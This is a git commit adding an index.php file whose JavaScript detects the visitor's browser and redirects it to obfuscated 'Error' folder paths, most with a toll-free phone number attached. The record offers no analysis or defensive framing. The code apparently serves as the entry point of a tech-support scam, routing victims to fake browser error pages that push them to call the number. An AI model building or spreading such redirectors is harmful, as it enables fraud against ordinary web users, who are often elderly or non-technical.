dc1570bef1d07da6a4df35357b21ccb2158cb4f8
ebookreader24 <116217354+ebookreader24@users.noreply.github.com>
2024-12-09 22:25:31 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,35 @@
+<script type="text/javascript">
+var isChromium = window.chrome,
+	vendorName = window.navigator.vendor,
+	isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
+	isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+isEdgeChromium = window.navigator.userAgent.indexOf("dg") > -1;
+
+if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
+	// is Google chrome
+window.location.href = "./ENJdfdfdDEfMnifd0CH888Error8/index.php?bcda=1-800-642-5919";
+}
+if(navigator.userAgent.indexOf("Firefox") != -1 )
+	{
+			 window.location.href = "./ENJdfdfdDEfMnifd00FF888Error8/index.php?bcda=1-800-642-5919";
+	}
+
+	if(window.navigator.userAgent.indexOf("dg") != -1 )
+		{
+				 window.location.href = "./ENJdfdfdDEfMnifd0ECH888Error8/index.php?bcda=1-800-642-5919";
+		}
+
+if(window.navigator.userAgent.indexOf("Edge") != -1 )
+	{
+			 window.location.href = "./ENJdfdfdDEfMnifd0ED888Error8/index.php?bcda=1-800-642-5919";
+	}
+if(window.navigator.userAgent.indexOf("Mac") != -1 )
+	{
+			 window.location.href = "./ENJdfdfdDEfMnifd00MA888Error8/index.php";
+	}
+if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
+	{
+		window.location.href = "./ENJdfdfdDEfMnifd00iE888Error8/index.php?bcda=1-800-642-5919";
+	}
+$SAFARI_URL = "apple";
+</script>
